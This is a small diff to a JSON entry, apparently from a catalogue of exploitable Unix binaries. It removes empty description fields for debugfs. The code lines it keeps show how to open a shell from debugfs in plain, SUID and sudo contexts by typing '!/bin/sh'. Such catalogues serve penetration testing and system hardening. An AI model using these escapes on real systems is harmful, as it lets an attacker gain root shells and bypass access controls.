@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "debugfs\n!/bin/sh\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./debugfs\n!/bin/sh\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo debugfs\n!/bin/sh\n"
       }
     ]
